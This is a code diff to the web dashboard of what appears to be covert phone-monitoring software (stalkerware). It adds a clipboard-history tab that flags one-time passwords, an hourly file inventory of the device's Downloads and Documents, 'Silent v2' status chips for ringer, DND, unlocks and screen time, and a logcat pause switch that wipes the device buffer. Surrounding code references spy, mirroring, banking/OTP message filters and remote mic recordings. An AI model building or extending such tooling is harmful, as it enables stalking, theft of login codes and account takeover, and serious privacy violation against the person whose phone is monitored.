@@ -299,6 +299,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <button class="tab-btn" data-tab="wifi">&#x1F4E1; WiFi</button>
 <button class="tab-btn" data-tab="logcat">&#x1F4DD; Logcat</button>
 <button class="tab-btn" data-tab="health">&#x1F4AA; Health</button>
+<button class="tab-btn" data-tab="clipboard">&#x1F4CB; Clipboard</button>
 </div>
 <div class="content" id="tabContent">
 <div class="active" id="tab-live">
@@ -343,6 +344,14 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swSteps">&#x1F45F; --</span>
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swWifi">&#x1F4E1; --</span>
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swSignal"><span class="wifi-signal"></span> --</span>
+</div>
+<div id="silentStateRow" style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap;font-size:10px">
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swRinger">&#x1F50A; --</span>
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swDnd">&#x1F514; --</span>
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swBrightness">&#x2600; --</span>
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swUptime">&#x23F1; --</span>
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swUnlocks">&#x1F513; --</span>
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swScreen">&#x1F4F1; --</span>
 </div>
 <div class="card" style="border-left-color:var(--accent);padding:12px;margin-top:8px">
   <div style="font-size:15px;font-weight:500;margin-bottom:8px">&#x1F4E1; Remote Sync Trigger</div>
@@ -453,6 +462,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <span class="chip" data-filter="banking" data-label="&#x1F4B3; Banking">&#x1F4B3; Banking</span>
 <span class="chip" data-filter="mirroring" data-label="&#x1F5A5; Mirroring">&#x1F5A5; Mirroring</span>
 <span class="chip" data-filter="security" data-label="&#x1F6E1; Security">&#x1F6E1; Security</span>
+<span class="chip" data-filter="general" data-label="&#x1F514; General">&#x1F514; General</span>
 </div>
 <div style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap">
 <select id="timelinePeriod" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 8px;border-radius:var(--radius);font-size:13px">
@@ -619,6 +629,14 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
   <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="refreshStorage()">&#x1F504; Refresh</span>
 </div>
 <div id="storageOverview" style="margin-bottom:14px"></div>
+<div style="border-top:1px solid var(--border);padding-top:10px;margin-bottom:14px">
+  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+    <span style="font-size:15px;font-weight:500">&#x1F4C1; File Inventory — Downloads / Documents</span>
+    <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollFileInventory()">&#x1F504; Refresh</span>
+  </div>
+  <div style="font-size:12px;color:var(--muted);margin-bottom:6px">Hourly snapshot from device (name, size, date, folder). No file content is uploaded.</div>
+  <div id="fileInventoryList"><div class="label">No file inventory yet</div></div>
+</div>
 <div style="border-top:1px solid var(--border);padding-top:10px">
   <div style="font-size:15px;font-weight:500;margin-bottom:8px">&#x1F9F9; Cleanup Actions</div>
   <div id="cleanupActions" style="display:flex;flex-direction:column;gap:6px"></div>
@@ -653,6 +671,17 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="clearLogcat()">&#x1F5D1; Clear</span>
 <span class="chip" style="background:var(--border);color:var(--text);font-size:13px;cursor:pointer" onclick="collapseAllLogcat()">&#x1F4C1; Collapse All</span>
 </div>
+</div>
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="logcatPauseToggle" onchange="toggleLogcatPause(this.checked)" style="opacity:0;width:0;height:0">
+<span id="logcatToggleSlider" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="logcatToggleKnob" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="logcatToggleLabel" style="font-size:13px;font-weight:600">Collecting (OFF)</span>
+</label>
+<span id="logcatToggleStatus" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
 </div>
 <div style="display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap">
 <select id="logcatFilter" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 8px;border-radius:6px;font-size:13px">
@@ -740,6 +769,14 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 <div id="medicationAdherence" style="margin-bottom:12px"></div>
 <div id="medicationList" style="display:flex;flex-direction:column;gap:8px"></div>
 </div>
+</div>
+<div id="tab-clipboard">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+  <span style="font-size:16px;font-weight:500">&#x1F4CB; Clipboard History</span>
+  <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollClipboard()">&#x1F504; Refresh</span>
+</div>
+<div style="font-size:12px;color:var(--muted);margin-bottom:8px">Live clipboard snapshots from device (polled ~30s when screen on). Shows last copied text, length, and OTP hint.</div>
+<div id="clipboardList"><div class="label">No clipboard data yet</div></div>
 </div>
 <div id="tab-playback">
 <div class="pb-stats" id="pbStats" style="display:none">
@@ -1268,7 +1305,7 @@ let playbackLoop = false;
 
 // --- Poll Timers ---
 let pollTimers = [];
-const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 3600000, logcat: 300000, remote: 30000, photos: 600000, videos: 60000, health: 3600000, mirror: 10000, spy: 10000 };
+const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 3600000, logcat: 300000, remote: 30000, photos: 600000, videos: 60000, health: 3600000, mirror: 10000, spy: 10000, clipboard: 30000, files: 60000 };
 let intervals = { ...BASE_INTERVALS };
 
 // --- Init Map ---
@@ -1928,7 +1965,7 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     if (btn.dataset.tab === 'videos') { renderVideosFromCache(); pollVideos(); }
     if (btn.dataset.tab === 'recents') pollAppSnapshots();
     if (btn.dataset.tab === 'wifi') pollWifiScans();
-    if (btn.dataset.tab === 'logcat') pollLogcat();
+    if (btn.dataset.tab === 'logcat') { pollLogcat(); pollLogcatToggleState(); }
     if (btn.dataset.tab === 'health') pollHealth();
     if (btn.dataset.tab === 'voice') { renderVoiceNotes(); pollVoiceNotes(); }
     if (btn.dataset.tab === 'remote') { renderRemoteRecordings(); pollRemoteRecordings(); }
@@ -2672,11 +2709,14 @@ function startPolling() {
   schedulePoll('queue', 30000, pollQueueSize);
   schedulePoll('wifi', 60000, pollWifiScans);
   schedulePoll('logcat', 60000, pollLogcat);
+  schedulePoll('logcatToggle', 15000, pollLogcatToggleState);
   schedulePoll('health', intervals.health, pollHealth);
   schedulePoll('mirror', intervals.mirror, pollMirroring);
   schedulePoll('spy', intervals.spy, pollSpy);
   schedulePoll('photos', intervals.photos, pollPhotos);
   schedulePoll('videos', 60000, pollVideos);
+  schedulePoll('clipboard', intervals.clipboard, pollClipboard);
+  schedulePoll('files', intervals.files, pollFileInventory);
 }
 
 function schedulePoll(name, interval, fn) {
@@ -2688,7 +2728,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollWifiScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy()];
+  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollWifiScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy(), pollClipboard(), pollFileInventory()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -2866,6 +2906,38 @@ async function pollMeta() {
     const barHtml = Array.from({length: 4}, (_, i) => `<span class="bar ${i < bars ? 'on' : ''} ${i === 3 && bars === 4 ? 's3' : ''} ${i === 0 && bars === 1 ? 's1' : ''}" style="width:${(i + 1) * 4}px"></span>`).join('');
     swSignal.innerHTML = `<span class="wifi-signal">${barHtml}</span> ${m.networkType || '--'}`;
   }
+  // ── Silent v2: ringer / DND / brightness / uptime / unlocks / screen time ──
+  try {
+    const swRinger = document.getElementById('swRinger');
+    if (swRinger && m.ringerMode) {
+      const icon = m.ringerMode === 'normal' ? '\u{1F50A}' : m.ringerMode === 'vibrate' ? '\u{1F4F3}' : m.ringerMode === 'silent' ? '\u{1F507}' : '\u{1F50A}';
+      swRinger.textContent = icon + ' ' + m.ringerMode;
+      swRinger.style.borderColor = m.ringerMode === 'silent' ? 'var(--danger)' : 'var(--border)';
+      swRinger.style.color = m.ringerMode === 'silent' ? 'var(--danger)' : 'var(--muted)';
+    }
+    const swDnd = document.getElementById('swDnd');
+    if (swDnd) {
+      const dnd = !!m.dndEnabled;
+      swDnd.textContent = dnd ? '\u{1F6AB} DND on' : '\u{1F514} DND off';
+      swDnd.style.borderColor = dnd ? 'var(--warning)' : 'var(--border)';
+      swDnd.style.color = dnd ? 'var(--warning)' : 'var(--muted)';
+    }
+    const swB = document.getElementById('swBrightness');
+    if (swB && m.screenBrightness != null) swB.textContent = '\u2600 ' + m.screenBrightness;
+    const swUp = document.getElementById('swUptime');
+    if (swUp && m.uptimeMs != null) {
+      const hrs = Math.floor(m.uptimeMs / 3600000);
+      swUp.textContent = '\u23F1 ' + (hrs < 24 ? hrs + 'h up' : Math.floor(hrs/24) + 'd up');
+    }
+    const swUl = document.getElementById('swUnlocks');
+    if (swUl && m.unlockCount != null) swUl.textContent = '\u{1F513} ' + m.unlockCount + ' unlocks';
+    const swSc = document.getElementById('swScreen');
+    if (swSc && m.totalScreenMs != null) {
+      const mins = Math.round(m.totalScreenMs / 60000);
+      const h = Math.floor(mins/60), mm = mins % 60;
+      swSc.textContent = '\u{1F4F1} ' + (h ? h + 'h ' + mm + 'm' : mm + 'm screen');
+    }
+  } catch {}
   if (m.deviceModel && devices[selectedDevice]) {
     const label = [m.manufacturer, m.deviceModel].filter(Boolean).join(' ');
     devices[selectedDevice].label = label;
@@ -5973,6 +6045,7 @@ function renderTimeline(docs) {
     if (type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction')) counts.banking = (counts.banking || 0) + 1;
     if (isMirrorType(type)) counts.mirroring = (counts.mirroring || 0) + 1;
     if (isSecurityType(type)) counts.security = (counts.security || 0) + 1;
+    if (type.includes('general')) counts.general = (counts.general || 0) + 1;
   }
   document.querySelectorAll('.chip[data-filter]').forEach(chip => {
     const f = chip.dataset.filter;
@@ -5996,6 +6069,7 @@ function renderTimeline(docs) {
     if (timelineFilter === 'banking') return type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction');
     if (timelineFilter === 'mirroring') return isMirrorType(type);
     if (timelineFilter === 'security') return isSecurityType(type);
+    if (timelineFilter === 'general') return type.includes('general');
     return true;
   });
   // Dedup BEFORE pagination so identical re-posted messages collapse into ONE row
@@ -6066,8 +6140,9 @@ function renderTimeline(docs) {
       const isUsbDbg = type.includes('usb_debug');
       const isAdbWifi = type.includes('adb_wifi');
       const isSec = isSecurityType(type);
-      const icon = isMirror ? (isUsbDbg || isAdbWifi ? '\u{1F50C}' : '\u{1F5A5}') : isSec ? '\u{1F6E1}' : type.includes('snapchat') ? '\u{1F4F8}' : type.includes('whatsapp') ? '\u{1F4AC}' : type.includes('call') ? '\u{1F4DE}' : type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction') ? '\u{1F4B3}' : '\u{1F4CD}';
-      const contact = d.contactName || d.contact || '';
+       const icon = isMirror ? (isUsbDbg || isAdbWifi ? '\u{1F50C}' : '\u{1F5A5}') : isSec ? '\u{1F6E1}' : type.includes('general') ? '\u{1F514}' : type.includes('snapchat') ? '\u{1F4F8}' : type.includes('whatsapp') ? '\u{1F4AC}' : type.includes('call') ? '\u{1F4DE}' : type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction') ? '\u{1F4B3}' : '\u{1F4CD}';
+       let contact = d.contactName || d.contact || '';
+       if (type.toLowerCase().includes('general') && d.appName) contact = d.appName + (contact ? ' \u00B7 ' + contact : '');
       const msg = d.messagePreview || '';
       const dur = d.duration || '';
       const dir = d.direction || '';
@@ -7595,6 +7670,49 @@ function collapseAllLogcat() {
   renderLogcat();
 }
 
+function updateLogcatToggleUI(paused) {
+  const t = document.getElementById('logcatPauseToggle');
+  const s = document.getElementById('logcatToggleSlider');
+  const k = document.getElementById('logcatToggleKnob');
+  const l = document.getElementById('logcatToggleLabel');
+  const st = document.getElementById('logcatToggleStatus');
+  if (t) t.checked = paused;
+  if (s) s.style.background = paused ? 'var(--danger)' : 'var(--success)';
+  if (k) k.style.left = paused ? '22px' : '2px';
+  if (l) { l.textContent = paused ? 'Paused (ON) — wiping device buffer' : 'Collecting (OFF) — 30-min bundles'; l.style.color = paused ? 'var(--danger)' : 'var(--success)'; }
+  if (st) st.textContent = paused ? 'Not collecting. Toggle OFF to resume + immediate bundle.' : 'Gathering 2000 lines for 30 min, even at night.';
+}
+
+async function pollLogcatToggleState() {
+  if (!selectedDevice) return;
+  try {
+    let v = await fetchRTDB(`devices/${selectedDevice}/config/logcat_enabled`);
+    let enabled = true;
+    if (v !== null && v !== undefined) {
+      if (typeof v === 'boolean') enabled = v;
+      else if (typeof v === 'object' && v !== null && 'enabled' in v) enabled = !!v.enabled;
+      else if (typeof v === 'string') enabled = v.toLowerCase().indexOf('false') === -1;
+    }
+    updateLogcatToggleUI(!enabled);
+  } catch {}
+}
+
+async function toggleLogcatPause(paused) {
+  if (!selectedDevice) return;
+  updateLogcatToggleUI(paused);
+  const enabled = !paused;
+  const statusEl = document.getElementById('logcatToggleStatus');
+  if (statusEl) statusEl.textContent = paused ? 'Pausing and wiping device buffer…' : 'Resuming — immediate bundle…';
+  try {
+    const ok1 = await writeRTDBStrict(`devices/${selectedDevice}/config/logcat_enabled`, enabled);
+    const cmd = paused ? 'pause' : 'resume';
+    const ok2 = await writeRTDBStrict(`devices/${selectedDevice}/commands/logcat_control`, { action: cmd, ts_ms: Date.now() });
+    if (ok1 && ok2) showAlert(paused ? 'Logcat paused — device buffer wiped (RTDB kept)' : 'Logcat resumed — bundle coming in ~30 sec then every 30 min', 'warn');
+    else showAlert('Failed to set logcat toggle', 'error');
+  } catch (e) { showAlert('Toggle failed: ' + e.message, 'error'); }
+  setTimeout(pollLogcatToggleState, 1500);
+}
+
 document.getElementById('logcatFilter')?.addEventListener('change', renderLogcat);
 document.getElementById('logcatSearch')?.addEventListener('input', renderLogcat);
 
@@ -7781,6 +7899,56 @@ async function pollHealth() {
   // Graceful empty state when nothing is synced
   const healthHint = document.getElementById('healthEmptyHint');
   if (healthHint) healthHint.style.display = hasAnyHealthData ? 'none' : 'block';
+}
+
+async function pollClipboard() {
+  if (!selectedDevice) return;
+  try {
+    const data = await fetchRTDB(`devices/${selectedDevice}/clipboardHistory`, 'orderBy=%22ts_ms%22&limitToLast=50');
+    const el = document.getElementById('clipboardList');
+    if (!el) return;
+    if (!data || typeof data !== 'object' || data === null) { el.innerHTML = '<div class="label">No clipboard data yet</div>'; return; }
+    const entries = Object.values(data).filter(v => v && v.text).sort((a,b)=> (parseInt(b.ts_ms||'0') - parseInt(a.ts_ms||'0')));
+    if (!entries.length) { el.innerHTML = '<div class="label">No clipboard data yet</div>'; return; }
+    el.innerHTML = entries.map(e => {
+      const ts = parseInt(e.ts_ms||'0'); const t = e.text || '';
+      const esc = t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+      const otpBadge = e.isOtp ? '<span class="chip" style="background:var(--warning);color:#000;font-size:10px;margin-left:6px">OTP</span>' : '';
+      const len = e.len || t.length;
+      return `<div class="card" style="border-left-color:var(--accent)"><div class="time">${pkt(ts)} \u00B7 ${len} chars${otpBadge}</div><div style="font-family:monospace;font-size:13px;white-space:pre-wrap;word-break:break-all;background:var(--bg);padding:8px 10px;border-radius:6px;margin-top:6px;border:1px solid var(--border)">${esc}</div><div style="margin-top:6px"><span class="chip" style="cursor:pointer" onclick="navigator.clipboard&&navigator.clipboard.writeText(${JSON.stringify(t).replace(/"/g,'&quot;')}).then(()=>showAlert('Copied','ok'))">&#x1F4CB; Copy</span></div></div>`;
+    }).join('');
+  } catch(e) { console.error('pollClipboard', e); }
+}
+
+async function pollFileInventory() {
+  if (!selectedDevice) return;
+  try {
+    const el = document.getElementById('fileInventoryList');
+    if (!el) return;
+    // Prefer latest snapshot, fall back to latest timestamp under fileInventory
+    let data = await fetchRTDB(`devices/${selectedDevice}/fileInventory/latest`);
+    if (!data || typeof data !== 'object' || !data.recent) {
+      const all = await fetchRTDB(`devices/${selectedDevice}/fileInventory`, 'shallow=true');
+      if (all && typeof all === 'object') {
+        const keys = Object.keys(all).filter(k => k !== 'latest').map(k=>parseInt(k)).filter(n=>!isNaN(n)).sort((a,b)=>b-a);
+        if (keys.length) data = await fetchRTDB(`devices/${selectedDevice}/fileInventory/${keys[0]}`);
+      }
+    }
+    if (!data || typeof data !== 'object') { el.innerHTML = '<div class="label">No file inventory yet</div>'; return; }
+    const files = data.files || data.recent || [];
+    const list = Array.isArray(files) ? files : Object.values(files);
+    if (!list.length) { el.innerHTML = `<div class="label">No files \u00B7 count: ${data.count||0}</div>`; return; }
+    const rows = list.slice(0, 50).map(f => {
+      const name = (f.name||'--').replace(/</g,'&lt;');
+      const ext = f.ext ? '.'+f.ext : '';
+      const size = f.size != null ? (f.size > 1048576 ? (f.size/1048576).toFixed(1)+' MB' : (f.size/1024).toFixed(1)+' KB') : '--';
+      const date = f.dateMs ? pkt(parseInt(f.dateMs)) : '--';
+      const folder = f.folder || '';
+      return `<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;border-bottom:1px solid var(--border);gap:8px"><div style="min-width:0"><div style="font-size:13px;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${name} <span style="color:var(--muted);font-size:11px">${ext}</span></div><div style="font-size:11px;color:var(--muted)">${folder} \u00B7 ${date}</div></div><span class="chip" style="font-size:11px;flex-shrink:0">${size}</span></div>`;
+    }).join('');
+    const count = data.count || list.length;
+    el.innerHTML = `<div style="font-size:12px;color:var(--muted);margin-bottom:6px">${count} files \u00B7 showing ${Math.min(list.length,50)}</div>${rows}`;
+  } catch(e) { console.error('pollFileInventory', e); }
 }
 
 function drawStepChartCanvas() {
